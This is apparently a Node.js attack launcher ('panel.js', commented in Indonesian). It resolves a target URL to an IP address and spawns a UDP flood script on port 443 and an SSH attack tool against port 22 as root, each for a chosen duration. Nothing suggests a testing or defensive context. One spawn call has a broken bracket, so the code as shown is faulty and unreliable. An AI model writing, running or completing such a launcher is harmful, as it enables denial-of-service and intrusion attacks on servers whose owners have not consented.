const { spawn } = require('child_process');
const dns = require('dns');
const url = require('url');

// Fungsi untuk mengambil IP dari hostname
function resolveIP(hostname) {
    return new Promise((resolve, reject) => {
        dns.lookup(hostname, (err, address) => {
            if (err) reject(err);
            else resolve(address);
        });
    });
}

// Fungsi untuk menjalankan command menggunakan spawn
function runCommand(command, args) {
    const process = spawn(command, args);

    process.stdout.on('data', (data) => {
        console.log(`${command} output: ${data}`);
    });

    process.stderr.on('data', (data) => {
        console.error(`${command} error: ${data}`);
    });

    process.on('close', (code) => {
        console.log(`${command} exited with code ${code}`);
    });
}

// Fungsi utama
async function main() {
    const args = process.argv.slice(2);
    if (args.length !== 2) {
        console.error('Usage: node panel.js [url] [time]');
        process.exit(1);
    }

    const targetUrl = args[0];
    const time = args[1];

    try {
        // Mengurai URL dan mengambil hostname
        const parsedUrl = new URL(targetUrl);
        const hostname = parsedUrl.hostname;

        // Mendapatkan IP dari hostname
        const ip = await resolveIP(hostname);

        // Menjalankan command dengan spawn
        runCommand('./lib/cache/udp.js', ip, '443', time]);
        runCommand('node', ['./lib/cache/StarsXSSH', ip, '22', 'root', time]);
    } catch (error) {
        console.error('Error:', error);
    }
}

main();
